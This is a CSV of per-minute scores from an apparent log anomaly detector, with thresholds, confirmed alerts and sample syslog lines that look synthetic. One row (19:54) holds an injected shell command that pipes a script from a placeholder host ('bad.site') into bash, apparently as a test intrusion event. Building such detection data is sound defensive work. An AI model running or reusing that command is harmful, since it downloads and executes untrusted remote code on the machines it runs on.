bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 19:35:00,0.6544452339283088,0,0,0.8224995273096307,3,59,smartd: Started Session c112 of user root. || docker: Started Session c95 of user root. || xinetd: Accepted publickey for user from 10.0.0.67 port 22 ssh2. || redis-server: Started Session c248 of user root. || logrotate: Listening on LVM2 poll daemo
2026-07-01 19:36:00,0.8339428519908304,1,0,0.8224995273096307,3,59,xinetd: Finished Daily apt download activities. || gpm: Synced RTC time from system clock. || named: Started Cleanup of Temporary Directories. || systemd-timesyncd: Started Cleanup of Temporary Directories. || unattended-upgrades: Rotating log files.
2026-07-01 19:37:00,0.8008752230275795,0,0,0.8224995273096307,3,61,named: Started Cleanup of Temporary Directories. || ntpd: Accepted publickey for user from 10.0.0.167 port 22 ssh2. || cups: Started Session c53 of user root. || ntpd: Started Cleanup of Temporary Directories. || unattended-upgrades: Accepted publick
2026-07-01 19:38:00,0.8620001535287545,1,0,0.8224995273096307,3,64,dockerd: Finished Daily apt download activities. || telnetd: Started Cleanup of Temporary Directories. || ftpd: Started Cleanup of Temporary Directories. || ftpd: Listening on LVM2 poll daemon socket. || xinetd: Started Cleanup of Temporary Directori
2026-07-01 19:39:00,0.8281486433222178,1,0,0.8224995273096307,3,62,dockerd: Finished Daily apt download activities. || NetworkManager: Rotating log files. || rsyslogd: Finished Daily apt download activities. || NetworkManager: Listening on LVM2 poll daemon socket. || sshd: Listening on LVM2 poll daemon socket. || na
2026-07-01 19:40:00,0.8452653382068013,1,1,0.8224995273096307,3,56,xinetd: Finished Daily apt download activities. || systemd-timesyncd: Synced RTC time from system clock. || CRON: Synced RTC time from system clock. || ftpd: Listening on LVM2 poll daemon socket. || xinetd: Rotating log files. || redis-server: Starte
2026-07-01 19:41:00,0.7257996632926312,0,0,0.8224995273096307,3,59,chronyd: Started Cleanup of Temporary Directories. || sudo: Rotating log files. || dockerd: Synced RTC time from system clock. || named: Synced RTC time from system clock. || sudo: Rotating log files. || logrotate: Listening on LVM2 poll daemon socke
2026-07-01 19:42:00,0.8177136473938496,0,0,0.8224995273096307,3,56,logrotate: Finished Daily apt download activities. || smartd: Started Session c71 of user root. || telnetd: Started Cleanup of Temporary Directories. || NetworkManager: Started Session c103 of user root. || dockerd: Listening on LVM2 poll daemon sock
2026-07-01 19:43:00,0.8776864492391522,1,0,0.8224995273096307,3,63,dockerd: Synced RTC time from system clock. || docker: Synced RTC time from system clock. || cups: Rotating log files. || chronyd: Accepted publickey for user from 10.0.0.191 port 22 ssh2. || gpm: Listening on LVM2 poll daemon socket. || kernel: Acce
2026-07-01 19:44:00,0.7661772124000223,0,0,0.8224995273096307,3,58,telnetd: Synced RTC time from system clock. || systemd-timesyncd: Rotating log files. || unattended-upgrades: Rotating log files. || cups: Finished Daily apt download activities. || unattended-upgrades: Rotating log files. || ufw: Accepted publickey 
2026-07-01 19:45:00,0.7713358533040785,0,0,0.8224995273096307,3,62,dockerd: Synced RTC time from system clock. || logrotate: Finished Daily apt download activities. || unattended-upgrades: Started Session c239 of user root. || CRON: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon so
2026-07-01 19:46:00,0.6171953971169404,0,0,0.8224995273096307,3,62,CRON: Accepted publickey for user from 10.0.0.154 port 22 ssh2. || chronyd: Started CUPS Scheduler. || logrotate: Started Session c78 of user root. || gpm: Rotating log files. || kernel: Rotating log files. || telnetd: Listening on LVM2 poll daemon s
2026-07-01 19:47:00,0.7064211426344269,0,0,0.8224995273096307,3,62,xinetd: Started Cleanup of Temporary Directories. || smartd: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.148 port 22 ssh2. || xinetd: Started CUPS Scheduler. || systemd-timesyncd: Started CUPS Scheduler. || systemd-timesy
2026-07-01 19:48:00,0.6254241053757345,0,0,0.8224995273096307,3,63,NetworkManager: Finished Daily apt download activities. || rsyslogd: Rotating log files. || CRON: Listening on LVM2 poll daemon socket. || CRON: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || NetworkManager: Started CUPS 
2026-07-01 19:49:00,0.5095900649800895,0,0,0.8224995273096307,3,59,chronyd: Finished Daily apt download activities. || dockerd: Started CUPS Scheduler. || NetworkManager: Rotating log files. || NetworkManager: Started Cleanup of Temporary Directories. || logrotate: Started Session c103 of user root. || smartd: Start
2026-07-01 19:50:00,0.555752583336103,0,0,0.8224995273096307,3,61,ntpd: Accepted publickey for user from 10.0.0.169 port 22 ssh2. || unix_chkpwd: Finished Daily apt download activities. || kernel: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. || rsyslogd: Listening 
2026-07-01 19:51:00,0.5655105226781193,0,0,0.8224995273096307,3,60,telnetd: Started Session c13 of user root. || sudo: Listening on LVM2 poll daemon socket. || rsyslogd: Finished Daily apt download activities. || ntpd: Started Cleanup of Temporary Directories. || gpm: Listening on LVM2 poll daemon socket. || systemd
2026-07-01 19:52:00,0.5583063741994719,0,0,0.8224995273096307,3,60,docker: Accepted publickey for user from 10.0.0.209 port 22 ssh2. || named: Synced RTC time from system clock. || docker: Finished Daily apt download activities. || smartd: Started Cleanup of Temporary Directories. || NetworkManager: Finished Daily a
2026-07-01 19:53:00,0.4962048475896158,0,0,0.8224995273096307,3,60,smartd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started CUPS Scheduler. || systemd: Started Session c218 of user root. || unattended-upgrades: Finished Daily apt download activities. || unix_chkpwd: Started Session c49 of user roo
2026-07-01 19:54:00,0.45651862847865565,0,0,0.8224995273096307,3,59,unix_chkpwd: Started Cleanup of Temporary Directories. || docker: Synced RTC time from system clock. || smartd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || telnetd: Started CUPS Scheduler. || logrotate: Started CUPS Scheduler. || rsys
2026-07-01 19:55:00,0.3722122915569726,0,0,0.8224995273096307,3,59,unix_chkpwd: Listening on LVM2 poll daemon socket. || logrotate: Started Cleanup of Temporary Directories. || ntpd: Accepted publickey for user from 10.0.0.150 port 22 ssh2. || systemd: Rotating log files. || ntpd: Accepted publickey for user from 10
2026-07-01 19:56:00,0.59264781353465,0,0,0.8224995273096307,3,59,sshd: Started Session c123 of user root. || kernel: Started Cleanup of Temporary Directories. || ntpd: Started Session c66 of user root. || sudo: Started Session c140 of user root. || NetworkManager: Rotating log files. || telnetd: Rotating log files
2026-07-01 19:57:00,0.45396121847823595,0,0,0.8224995273096307,3,60,ntpd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Finished Daily apt download activities. || logrotate: Accepted publickey for user from 10.0.0.97 port 22 ssh2. || systemd: Started Session c57 of user root. || unattended-upgrades: S
2026-07-01 19:58:00,0.6667756090113579,0,0,0.8224995273096307,3,58,ftpd: Synced RTC time from system clock. || sshd: Started CUPS Scheduler. || kernel: Rotating log files. || redis-server: Finished Daily apt download activities. || systemd: Listening on LVM2 poll daemon socket. || sshd: Started Session c187 of user 
2026-07-01 19:59:00,0.8235278715774924,1,0,0.8224995273096307,3,59,smartd: Synced RTC time from system clock. || kernel: Listening on LVM2 poll daemon socket. || chronyd: Synced RTC time from system clock. || CRON: Started Session c84 of user root. || systemd: Started CUPS Scheduler. || smartd: Accepted publickey fo
2026-07-01 20:00:00,0.8143485738997165,0,0,0.8224995273096307,3,61,sudo: Rotating log files. || logrotate: Listening on LVM2 poll daemon socket. || dockerd: Started Cleanup of Temporary Directories. || ufw: Started Cleanup of Temporary Directories. || kernel: Accepted publickey for user from 10.0.0.159 port 22 ssh2.
2026-07-01 20:01:00,0.6932200905283284,0,0,0.8224995273096307,3,61,gpm: Started Session c128 of user root. || kernel: Accepted publickey for user from 10.0.0.232 port 22 ssh2. || sudo: Started CUPS Scheduler. || xinetd: Started CUPS Scheduler. || systemd: Listening on LVM2 poll daemon socket. || rsyslogd: Finished D
2026-07-01 20:02:00,0.5164296386495397,0,0,0.8224995273096307,3,62,systemd: Started CUPS Scheduler. || xinetd: Synced RTC time from system clock. || CRON: Started Session c86 of user root. || gpm: Accepted publickey for user from 10.0.0.127 port 22 ssh2. || named: Accepted publickey for user from 10.0.0.180 port 22 
2026-07-01 20:03:00,0.3903356146180023,0,0,0.8224995273096307,3,60,smartd: Listening on LVM2 poll daemon socket. || telnetd: Rotating log files. || cups: Synced RTC time from system clock. || named: Finished Daily apt download activities. || sudo: Accepted publickey for user from 10.0.0.251 port 22 ssh2. || named: F
2026-07-01 20:04:00,0.6065724247456542,0,0,0.8224995273096307,3,62,docker: Started Session c19 of user root. || systemd: Started Session c61 of user root. || xinetd: Synced RTC time from system clock. || docker: Finished Daily apt download activities. || unattended-upgrades: Started CUPS Scheduler. || ftpd: Synced R
2026-07-01 20:05:00,0.5161231295361632,0,0,0.8224995273096307,3,58,sudo: Started Cleanup of Temporary Directories. || docker: Started Session c12 of user root. || ufw: Rotating log files. || ufw: Listening on LVM2 poll daemon socket. || dockerd: Accepted publickey for user from 10.0.0.73 port 22 ssh2. || ntpd: Accep
2026-07-01 20:06:00,0.7391115232290809,0,0,0.8224995273096307,3,59,ntpd: Started Session c143 of user root. || dockerd: Accepted publickey for user from 10.0.0.120 port 22 ssh2. || xinetd: Finished Daily apt download activities. || systemd-timesyncd: Finished Daily apt download activities. || cups: Accepted publicke
2026-07-01 20:07:00,0.7735650803569485,0,0,0.8224995273096307,3,59,gpm: Listening on LVM2 poll daemon socket. || redis-server: Started CUPS Scheduler. || logrotate: Finished Daily apt download activities. || cups: Rotating log files. || cups: Rotating log files. || smartd: Started CUPS Scheduler. || chronyd: Started
2026-07-01 20:08:00,0.8270177754013424,1,0,0.8224995273096307,3,63,ntpd: Listening on LVM2 poll daemon socket. || dockerd: Started Cleanup of Temporary Directories. || redis-server: Started Session c166 of user root. || xinetd: Accepted publickey for user from 10.0.0.107 port 22 ssh2. || ufw: Synced RTC time from sy
2026-07-01 20:09:00,0.8726399581264583,1,0,0.8224995273096307,3,61,sudo: Started Session c88 of user root. || telnetd: Started CUPS Scheduler. || cups: Started Cleanup of Temporary Directories. || systemd: Finished Daily apt download activities. || docker: Started Session c65 of user root. || rsyslogd: Started Clean
2026-07-01 20:10:00,0.8918442658802109,1,1,0.8224995273096307,3,60,logrotate: Finished Daily apt download activities. || redis-server: Synced RTC time from system clock. || smartd: Started Session c97 of user root. || sshd: Rotating log files. || named: Synced RTC time from system clock. || kernel: Listening on LVM2
2026-07-01 20:11:00,0.8434286138443127,1,1,0.8224995273096307,3,60,logrotate: Rotating log files. || ntpd: Started CUPS Scheduler. || telnetd: Started CUPS Scheduler. || named: Synced RTC time from system clock. || rsyslogd: Synced RTC time from system clock. || gpm: Started Cleanup of Temporary Directories. || teln
2026-07-01 20:12:00,0.8594991725569814,1,1,0.8224995273096307,3,61,CRON: Started Session c177 of user root. || xinetd: Started CUPS Scheduler. || systemd-timesyncd: Rotating log files. || xinetd: Rotating log files. || ntpd: Started Cleanup of Temporary Directories. || gpm: Started Cleanup of Temporary Directories. 
2026-07-01 20:13:00,0.8667451889903205,1,1,0.8224995273096307,3,59,sshd: Started Cleanup of Temporary Directories. || chronyd: Listening on LVM2 poll daemon socket. || systemd: Finished Daily apt download activities. || named: Started Cleanup of Temporary Directories. || redis-server: Rotating log files. || docker: 
2026-07-01 20:14:00,0.8892433470984329,1,1,0.8224995273096307,3,62,ftpd: Synced RTC time from system clock. || systemd: Started Session c67 of user root. || kernel: Started Cleanup of Temporary Directories. || rsyslogd: Listening on LVM2 poll daemon socket. || systemd: Finished Daily apt download activities. || name
2026-07-01 20:15:00,0.8329639954475166,1,1,0.8224995273096307,3,59,ftpd: Started Cleanup of Temporary Directories. || sudo: Finished Daily apt download activities. || CRON: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started Session c111 of user root. || docker: Started Session c146 of user root. || xinetd
2026-07-01 20:16:00,0.7690013107653534,0,0,0.8224995273096307,3,58,smartd: Started Cleanup of Temporary Directories. || kernel: Rotating log files. || unix_chkpwd: Finished Daily apt download activities. || docker: Started CUPS Scheduler. || rsyslogd: Started Session c99 of user root. || smartd: Accepted publickey f
2026-07-01 20:17:00,0.7454711975358395,0,0,0.8224995273096307,3,60,systemd-timesyncd: Started Session c252 of user root. || NetworkManager: Listening on LVM2 poll daemon socket. || redis-server: Accepted publickey for user from 10.0.0.195 port 22 ssh2. || chronyd: Finished Daily apt download activities. || redis-ser
2026-07-01 20:18:00,0.7315513960280725,0,0,0.8224995273096307,3,60,ufw: Rotating log files. || named: Started CUPS Scheduler. || unix_chkpwd: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || docker: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. ||
2026-07-01 20:19:00,0.7380029809313585,0,0,0.8224995273096307,3,61,rsyslogd: Rotating log files. || ufw: Started CUPS Scheduler. || sudo: Finished Daily apt download activities. || gpm: Started Session c63 of user root. || sshd: Rotating log files. || unattended-upgrades: Started CUPS Scheduler. || unattended-upgrad
2026-07-01 20:20:00,0.732257280961109,0,0,0.8224995273096307,3,57,logrotate: Accepted publickey for user from 10.0.0.209 port 22 ssh2. || telnetd: Started Cleanup of Temporary Directories. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || redis-server: Started Session c64 of user root. || ntpd: Started
2026-07-01 20:21:00,0.6849618205766203,0,0,0.8224995273096307,3,61,unix_chkpwd: Started Cleanup of Temporary Directories. || unix_chkpwd: Accepted publickey for user from 10.0.0.203 port 22 ssh2. || sshd: Finished Daily apt download activities. || docker: Started Session c34 of user root. || xinetd: Synced RTC time 
